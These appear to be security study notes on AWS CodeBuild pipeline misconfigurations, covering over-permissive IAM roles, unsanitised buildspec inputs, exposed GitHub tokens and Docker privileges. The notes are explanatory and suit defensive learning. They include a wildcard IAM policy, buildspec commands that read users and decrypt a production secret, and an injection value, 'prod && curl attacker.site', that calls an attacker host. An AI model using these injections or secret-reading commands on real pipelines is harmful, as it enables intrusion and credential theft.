- A pipeline misconfiguration occurs when build or deployment workflows are designed without enforcing security boundaries, trust validation, or permission scoping
- This allows untrusted inputs (like source code, PRs, or environment variables) to be processed with privileged access, leading to:
    - Code execution
    - Privilege escalation
    - Secret exfiltration
    - Artifact poisoning

## Over-Permissive IAM Role
CodeBuild’s IAM role allows broad actions across AWS
- Attackers can escalate privileges from inside a build container
- Steal secrets, pivot via sts:AssumeRole, create persistence
```json
{
	"Effect": "Allow", 
	"Action": "*", 
	"Resource": "*"
}
```
- Attacker modifies buildspec.yml:
```json
build:
	commands:
		- aws iam list-users
		- aws ssm get-parameter --name /prod/db --with-decryption
```

## Unvalidated Inputs in buildspec.yml
Scripts use unsanitized inputs from GitHub PRs, pipeline variables, or ENV
- Leads to command injection
- Used for lateral movement or data theft
```
env:
	variables:
		TARGET: $INPUT
```
- Build runs:
```
echo "Deploying to $TARGET"
```
- Malicious input: **prod && curl attacker.site**

## Exposed GitHub OAuth Tokens
- GitHub tokens used for source authentication are not rotated or are stored insecurely
- Attacker gains token → can push to repo, modify buildspec, hijack pipeline

## Unrestricted Docker Privileges in Custom Images
- Custom build environments may include docker.sock or other unsafe tools
- Can lead to container escape or host compromise (if reused)

## Quick Summary Of Misconfigurations in AWS CodeBuild
| Misconfiguration                      | Exploitable Behavior                                  |
| ------------------------------------- | ----------------------------------------------------- |
| Over-permissive IAM Role              | Attacker injects AWS CLI commands in buildspec.yml    |
| No branch validation                  | PRs from forks trigger high-privilege workflows       |
| Shared CodeBuild project for dev/prod | PR modifies logic and deploys to prod                 |
| No input sanitization                 | User input in env or scripts leads to shell injection |
| VPC access + lax security groups      | CodeBuild job can scan internal network               |
| Pulling code from unverified sources  | Malicious code enters trusted CI pipeline             |
